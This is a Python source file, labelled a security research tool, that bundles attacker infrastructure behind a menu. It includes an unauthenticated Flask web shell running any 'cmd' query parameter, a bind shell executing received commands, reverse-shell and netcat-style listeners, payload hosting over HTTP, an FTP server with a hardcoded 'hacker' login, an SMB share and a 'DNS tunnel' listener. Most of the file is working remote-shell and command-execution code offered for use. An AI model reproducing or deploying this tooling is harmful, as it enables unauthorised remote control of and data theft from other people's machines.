import os
import socket
import threading
import subprocess
from flask import Flask, request
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
from dnslib.server import DNSServer, DNSLogger, DNSHandler
import smtpd
import asyncore

# 🚀 HACKER BANNER
BANNER = """
   ____          _    ____                        ____
  / ___| ___  ___| |_ | _ \__    ___ __ / ___|  ___ _ ____  _____ _ __
 | |  _ / _ \/ _ \ |/ / |_) \ \ /\ / / '_ \___ \ / _ \ '__\ \ / / _ \ '__|
 | |_| | __/ __/  <|  __/ \ V  V /| | | |___) | __/ |   \ V / __/ |
  \____|\___|\___|_|_|_|     _/_/ |_| |_|____/ \___|_|    _/ \___|_|
   🔥 Python Security Research Tool 🔥
"""

app = Flask(__name__)

@app.route('/cmd', methods=['GET'])
def run_command():
    cmd = request.args.get('cmd')
    if cmd:
        try:
            output = subprocess.getoutput(cmd)
            return f"<pre>{output}</pre>"
        except Exception as e:
            return f"<pre>Error: {e}</pre>"
    else:
        return "<pre>No command provided.</pre>"

def start_http_server(port=8080):
    try:
        os.system(f"python3 -m http.server {port}")
    except Exception as e:
        print(f"HTTP Server Error: {e}")

def start_reverse_shell_listener(port=4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind(("0.0.0.0", port))
        s.listen(1)
        print(f"🎯 Reverse Shell Listening on port {port}...")
        conn, addr = s.accept()
        print(f"🔗 Connection from {addr}")

        while True:
            try:
                command = input("Shell> ")
                conn.send(command.encode())
                response = conn.recv(1024).decode()
                print(response)
            except (BrokenPipeError, ConnectionResetError):
                print("Connection closed.")
                break
    except Exception as e:
        print(f"Reverse Shell Error: {e}")
    finally:
        s.close()

def start_bind_shell(port=5555):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind(("0.0.0.0", port))
        s.listen(1)
        print(f"🔌 Bind Shell Listening on port {port}...")
        conn, addr = s.accept()

        while True:
            try:
                command = conn.recv(1024).decode()
                output = subprocess.getoutput(command)
                conn.send(output.encode())
            except (BrokenPipeError, ConnectionResetError):
                print("Connection closed.")
                break
    except Exception as e:
        print(f"Bind Shell Error: {e}")
    finally:
        s.close()

def start_ftp_server():
    try:
        authorizer = DummyAuthorizer()
        authorizer.add_user("hacker", "12345", ".", perm="elradfmw")
        handler = FTPHandler
        handler.authorizer = authorizer
        server = FTPServer(("0.0.0.0", 21), handler)
        print("📡 FTP Server Started on Port 21")
        server.serve_forever()
    except Exception as e:
        print(f"FTP Server Error: {e}")

class CustomDNSHandler(DNSHandler):
    def resolve(self, request, handler):
        qname = str(request.q.qname)
        print(f"📡 Received DNS query: {qname}")
        return request.reply()

def start_dns_server():
    try:
        logger = DNSLogger()
        server = DNSServer(CustomDNSHandler(), port=53, address="0.0.0.0", logger=logger)
        print("🌍 DNS Tunnel Server Started on Port 53")
        server.start()
    except Exception as e:
        print(f"DNS Server Error: {e}")

def start_tcp_shell(port=7777):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind(("0.0.0.0", port))
        s.listen(1)
        print(f"💀 TCP Shell Listening on port {port}...")
        conn, addr = s.accept()

        while True:
            try:
                command = input("Shell> ")
                conn.send(command.encode())
                output = conn.recv(1024).decode()
                print(output)
            except (BrokenPipeError, ConnectionResetError):
                print("Connection closed.")
                break
    except Exception as e:
        print(f"TCP Shell Error: {e}")
    finally:
        s.close()

def start_smb_server():
    try:
        subprocess.Popen(["impacket-smbserver", "SHARE", os.getcwd(), "-smb2support"])
        print("📁 SMB Server Started")
    except FileNotFoundError:
        print("impacket not found. Install impacket to use SMB Server.")
    except Exception as e:
        print(f"SMB Server Error: {e}")

def start_web_shell():
    try:
        app.run(host="0.0.0.0", port=8081)
    except Exception as e:
        print(f"Web Shell Error: {e}")

class CustomSMTPServer(smtpd.SMTPServer):
    def process_message(self, peer, mailfrom, rcpttos, data, **kwargs):
        print(f"📧 Received email from {mailfrom} to {rcpttos}")
        print(data.decode())
        return None

def start_smtp_server(port=25):
    try:
        server = CustomSMTPServer(("0.0.0.0", port), None)
        print(f"✉️ SMTP Server Started on Port {port}")
        asyncore.loop()
    except Exception as e:
        print(f"SMTP Server Error: {e}")

def main():
    print(BANNER)
    print("\n[*] Select an Option:")
    print("1️⃣  Start HTTP Server (Payload Hosting)")
    print("2️⃣  Start Reverse Shell Listener")
    print("3️⃣  Start Bind Shell Listener")
    print("4️⃣  Start Web Shell (Flask)")
    print("5️⃣  Start FTP Server")
    print("6️⃣  Start SMB Server")
    print("7️⃣  Start DNS Tunnel Server")
    print("8️⃣  Start Netcat-style TCP Shell")
    print("9️⃣  Start SMTP Server")
    print("10  Exit")

    choice = input("\nEnter choice: ")

    if choice == "1":
        threading.Thread(target=start_http_server, args=(8080,)).start()
    elif choice == "2":
        threading.Thread(target=start_reverse_shell_listener, args=(4444,)).start()
    elif choice == "3":
        threading.Thread(target=start_bind_shell, args=(5555,)).start()
    elif choice == "4":
        threading.Thread(target=start_web_shell).start()
    elif choice == "5":
        threading.Thread(target=start_ftp_server).start()
    elif choice == "6":
        threading.Thread(target=start_smb_server).start()
    elif choice == "7":
        threading.Thread(target=start_dns_server).start()
    elif choice == "8":
        threading.Thread(target=start_tcp_shell, args=(7777,)).start()
    elif choice == "9":
        threading.Thread(target=start_smtp_server, args=(25,)).start()
    elif choice == "10":
        print("🔴 Exiting...")
        exit()
    else:
        print("❌ Invalid Choice!")

if __name__ == "__main__":
    main()
